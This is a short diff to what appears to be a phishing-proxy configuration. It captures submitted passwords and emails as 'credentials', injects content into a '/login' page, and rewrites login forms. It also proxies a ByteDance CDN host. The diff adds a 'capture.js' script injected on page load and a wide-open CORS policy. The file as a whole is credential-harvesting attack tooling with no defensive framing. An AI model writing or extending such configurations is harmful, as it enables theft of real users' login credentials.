@@ -21,6 +21,7 @@ credentials:
   - {type: "post_param", name: "password", regex: null}
   - {type: "post_param", name: "email", regex: null}
 injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
   - trigger_path: "/login"
     position: "body_end"
     content: |
@@ -43,3 +44,7 @@ form_actions:
   - {selector: "form[action*=\"login\"]", action_to: "/api/login"}
 bridges:
   - {prefix: "/_cdn/", target_host: "sf16-scmcdn-sg.ibytedtos.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
